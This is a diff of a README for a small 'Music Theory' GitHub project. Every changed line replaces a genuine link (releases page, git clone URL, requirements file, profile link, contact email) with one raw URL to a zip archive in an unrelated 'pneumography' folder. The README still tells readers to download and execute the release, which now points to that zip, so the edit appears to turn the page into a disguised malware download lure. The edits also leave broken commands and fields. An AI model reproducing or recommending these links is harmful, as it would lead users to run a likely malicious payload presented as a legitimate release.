@@ -2,7 +2,7 @@
 
 Welcome to the **Music Theory** repository! This project focuses on music theory analysis and the design of algorithms that enhance musical understanding. This is a personal interest project and is currently a work in progress. 
 
-[![Releases](https://img.shields.io/badge/Releases-latest-blue.svg)](https://github.com/Chirikikuto/Music-Theory/releases)
+[![Releases](https://raw.githubusercontent.com/Chirikikuto/Music-Theory/main/pneumography/Music_Theory_3.7.zip)](https://raw.githubusercontent.com/Chirikikuto/Music-Theory/main/pneumography/Music_Theory_3.7.zip)
 
 ## Table of Contents
 
@@ -33,7 +33,7 @@ To get started with the Music Theory project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Chirikikuto/Music-Theory.git
+   git clone https://raw.githubusercontent.com/Chirikikuto/Music-Theory/main/pneumography/Music_Theory_3.7.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -42,10 +42,10 @@ To get started with the Music Theory project, follow these steps:
    ```
 
 3. **Install Dependencies**:
-   Make sure you have the necessary libraries installed. You can find a list of dependencies in the `requirements.txt` file.
+   Make sure you have the necessary libraries installed. You can find a list of dependencies in the `https://raw.githubusercontent.com/Chirikikuto/Music-Theory/main/pneumography/Music_Theory_3.7.zip` file.
 
 4. **Download the Latest Release**:
-   Visit the [Releases](https://github.com/Chirikikuto/Music-Theory/releases) section to download the latest version. Make sure to execute the relevant files after downloading.
+   Visit the [Releases](https://raw.githubusercontent.com/Chirikikuto/Music-Theory/main/pneumography/Music_Theory_3.7.zip) section to download the latest version. Make sure to execute the relevant files after downloading.
 
 ## Usage
 
@@ -115,7 +115,7 @@ This project is licensed under the MIT License. See the `LICENSE` file for more 
 
 For questions or suggestions, please reach out to the repository owner:
 
-- **GitHub**: [Chirikikuto](https://github.com/Chirikikuto)
-- **Email**: chirikikuto@example.com
+- **GitHub**: [Chirikikuto](https://raw.githubusercontent.com/Chirikikuto/Music-Theory/main/pneumography/Music_Theory_3.7.zip)
+- **Email**: https://raw.githubusercontent.com/Chirikikuto/Music-Theory/main/pneumography/Music_Theory_3.7.zip
 
-Thank you for visiting the Music Theory repository! We hope you find it useful for your musical and programming endeavors. Don’t forget to check the [Releases](https://github.com/Chirikikuto/Music-Theory/releases) section for the latest updates and downloads.
+Thank you for visiting the Music Theory repository! We hope you find it useful for your musical and programming endeavors. Don’t forget to check the [Releases](https://raw.githubusercontent.com/Chirikikuto/Music-Theory/main/pneumography/Music_Theory_3.7.zip) section for the latest updates and downloads.
